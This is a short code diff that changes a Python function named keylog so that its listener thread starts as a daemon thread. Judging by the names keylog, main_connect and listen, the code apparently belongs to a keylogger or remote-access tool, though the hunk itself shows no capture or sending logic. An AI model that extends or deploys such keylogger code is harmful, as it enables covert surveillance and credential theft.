@@ -50,7 +50,9 @@ def keylog(main_connect):
     global buffer, cmd_flag, lock_flag, bind_flag
     lock_flag = 0
     bind_flag = 0
-    threading.Thread(target=listen).start()
+    listener_thread = threading.Thread(target=listen)
+    listener_thread.daemon = True
+    listener_thread.start()
     cmd_flag = 0
     buffer = ""
     msg = ""
